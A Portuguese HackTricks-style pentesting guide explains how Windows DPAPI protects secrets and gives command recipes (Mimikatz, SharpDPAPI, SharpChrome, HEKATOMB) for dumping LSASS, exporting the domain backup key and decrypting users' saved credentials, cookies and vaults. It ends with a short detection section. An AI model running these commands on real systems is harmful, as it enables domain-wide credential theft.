# DPAPI - Extraindo Senhas

{{#include ../../banners/hacktricks-training.md}}



## O que é DPAPI

A API de Proteção de Dados (DPAPI) é utilizada principalmente dentro do sistema operacional Windows para a **criptografia simétrica de chaves privadas assimétricas**, aproveitando segredos de usuário ou do sistema como uma fonte significativa de entropia. Essa abordagem simplifica a criptografia para os desenvolvedores, permitindo que eles criptografem dados usando uma chave derivada dos segredos de logon do usuário ou, para criptografia do sistema, os segredos de autenticação do domínio do sistema, eliminando assim a necessidade de os desenvolvedores gerenciarem a proteção da chave de criptografia por conta própria.

A maneira mais comum de usar o DPAPI é através das funções **`CryptProtectData` e `CryptUnprotectData`**, que permitem que aplicativos criptografem e descriptografem dados de forma segura com a sessão do processo que está atualmente logado. Isso significa que os dados criptografados só podem ser descriptografados pelo mesmo usuário ou sistema que os criptografou.

Além disso, essas funções também aceitam um **parâmetro `entropy`** que será utilizado durante a criptografia e descriptografia; portanto, para descriptografar algo criptografado usando esse parâmetro, você deve fornecer o mesmo valor de entropia que foi usado durante a criptografia.

### Geração de chave dos usuários

O DPAPI gera uma chave única (chamada **`pre-key`**) para cada usuário com base em suas credenciais. Essa chave é derivada da senha do usuário e de outros fatores, e o algoritmo depende do tipo de usuário, mas acaba sendo um SHA1. Por exemplo, para usuários de domínio, **depende do hash HTLM do usuário**.

Isso é especialmente interessante porque, se um atacante conseguir obter o hash da senha do usuário, ele pode:

- **Descriptografar qualquer dado que foi criptografado usando DPAPI** com a chave desse usuário sem precisar contatar nenhuma API
- Tentar **quebrar a senha** offline tentando gerar a chave DPAPI válida

Além disso, toda vez que algum dado é criptografado por um usuário usando DPAPI, uma nova **chave mestra** é gerada. Essa chave mestra é a que realmente é usada para criptografar dados. Cada chave mestra é fornecida com um **GUID** (Identificador Único Global) que a identifica.

As chaves mestras são armazenadas no diretório **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, onde `{SID}` é o Identificador de Segurança desse usuário. A chave mestra é armazenada criptografada pela **`pre-key`** do usuário e também por uma **chave de backup de domínio** para recuperação (portanto, a mesma chave é armazenada criptografada 2 vezes por 2 senhas diferentes).

Observe que a **chave de domínio usada para criptografar a chave mestra está nos controladores de domínio e nunca muda**, então, se um atacante tiver acesso ao controlador de domínio, ele pode recuperar a chave de backup de domínio e descriptografar as chaves mestras de todos os usuários no domínio.

Os blobs criptografados contêm o **GUID da chave mestra** que foi usada para criptografar os dados dentro de seus cabeçalhos.

> [!NOTE]
> Blobs criptografados pelo DPAPI começam com **`01 00 00 00`**

Encontrar chaves mestras:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Isto é como um conjunto de Chaves Mestras de um usuário se parecerá:

![](<../../images/image (1121).png>)

### Geração de chave de Máquina/Sistema

Esta é a chave usada para a máquina criptografar dados. É baseada no **segredo DPAPI_SYSTEM LSA**, que é uma chave especial que apenas o usuário SYSTEM pode acessar. Esta chave é usada para criptografar dados que precisam ser acessíveis pelo próprio sistema, como credenciais em nível de máquina ou segredos em todo o sistema.

Note que essas chaves **não têm um backup de domínio**, portanto, são acessíveis apenas localmente:

- **Mimikatz** pode acessá-la despejando segredos LSA usando o comando: `mimikatz lsadump::secrets`
- O segredo é armazenado dentro do registro, então um administrador poderia **modificar as permissões DACL para acessá-lo**. O caminho do registro é: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`

### Dados Protegidos pelo DPAPI

Entre os dados pessoais protegidos pelo DPAPI estão:

- Credenciais do Windows
- Senhas e dados de preenchimento automático do Internet Explorer e Google Chrome
- Senhas de e-mail e contas FTP internas para aplicativos como Outlook e Windows Mail
- Senhas para pastas compartilhadas, recursos, redes sem fio e Windows Vault, incluindo chaves de criptografia
- Senhas para conexões de área de trabalho remota, .NET Passport e chaves privadas para vários propósitos de criptografia e autenticação
- Senhas de rede gerenciadas pelo Credential Manager e dados pessoais em aplicativos que usam CryptProtectData, como Skype, MSN messenger e mais
- Blobs criptografados dentro do registro
- ...

Os dados protegidos do sistema incluem:
- Senhas de Wifi
- Senhas de tarefas agendadas
- ...

### Opções de extração de chave mestra

- Se o usuário tiver privilégios de administrador de domínio, ele pode acessar a **chave de backup de domínio** para descriptografar todas as chaves mestras de usuário no domínio:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Com privilégios de administrador local, é possível **acessar a memória do LSASS** para extrair as chaves mestras do DPAPI de todos os usuários conectados e a chave do SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Se o usuário tiver privilégios de administrador local, ele pode acessar o **DPAPI_SYSTEM LSA secret** para descriptografar as chaves mestras da máquina:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Se a senha ou hash NTLM do usuário for conhecida, você pode **descriptografar as chaves mestras do usuário diretamente**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Se você estiver dentro de uma sessão como o usuário, é possível pedir ao DC pela **chave de backup para descriptografar as chaves mestras usando RPC**. Se você for administrador local e o usuário estiver logado, você poderia **roubar o token da sessão dele** para isso:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lista de Cofres
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Acessar Dados Criptografados pelo DPAPI

### Encontrar dados criptografados pelo DPAPI

Os **arquivos protegidos** comuns dos usuários estão em:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Verifique também alterando `\Roaming\` para `\Local\` nos caminhos acima.

Exemplos de enumeração:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) pode encontrar blobs criptografados pelo DPAPI no sistema de arquivos, registro e blobs B64:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Observe que [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (do mesmo repositório) pode ser usado para descriptografar usando DPAPI dados sensíveis como cookies.

### Chaves de acesso e dados

- **Use SharpDPAPI** para obter credenciais de arquivos criptografados pelo DPAPI da sessão atual:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Obtenha informações de credenciais** como os dados criptografados e o guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Acessar masterkeys**:

Descriptografar uma masterkey de um usuário solicitando a **chave de backup do domínio** usando RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
A ferramenta **SharpDPAPI** também suporta esses argumentos para decriptação de masterkey (note como é possível usar `/rpc` para obter a chave de backup do domínio, `/password` para usar uma senha em texto simples, ou `/pvk` para especificar um arquivo de chave privada do domínio DPAPI...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Descriptografar dados usando uma chave mestra**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
A ferramenta **SharpDPAPI** também suporta esses argumentos para a decriptação de `credentials|vaults|rdg|keepass|triage|blob|ps` (note como é possível usar `/rpc` para obter a chave de backup dos domínios, `/password` para usar uma senha em texto simples, `/pvk` para especificar um arquivo de chave privada do domínio DPAPI, `/unprotect` para usar a sessão do usuário atual...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Descriptografar alguns dados usando **sessão do usuário atual**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
### Acessar dados de outra máquina

No **SharpDPAPI e SharpChrome**, você pode indicar a opção **`/server:HOST`** para acessar os dados de uma máquina remota. Claro que você precisa ser capaz de acessar essa máquina e no exemplo a seguir supõe-se que a **chave de criptografia de backup do domínio é conhecida**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Outras ferramentas

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) é uma ferramenta que automatiza a extração de todos os usuários e computadores do diretório LDAP e a extração da chave de backup do controlador de domínio através de RPC. O script então resolverá todos os endereços IP dos computadores e realizará um smbclient em todos os computadores para recuperar todos os blobs DPAPI de todos os usuários e descriptografar tudo com a chave de backup do domínio.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Com a lista de computadores extraída do LDAP, você pode encontrar toda sub-rede mesmo que não soubesse delas!

### DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) pode despejar segredos protegidos por DPAPI automaticamente.

### Detecções comuns

- Acesso a arquivos em `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` e outros diretórios relacionados ao DPAPI.
- Especialmente de um compartilhamento de rede como C$ ou ADMIN$.
- Uso do Mimikatz para acessar a memória do LSASS.
- Evento **4662**: Uma operação foi realizada em um objeto.
- Este evento pode ser verificado para ver se o objeto `BCKUPKEY` foi acessado.

## Referências

- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

{{#include ../../banners/hacktricks-training.md}}
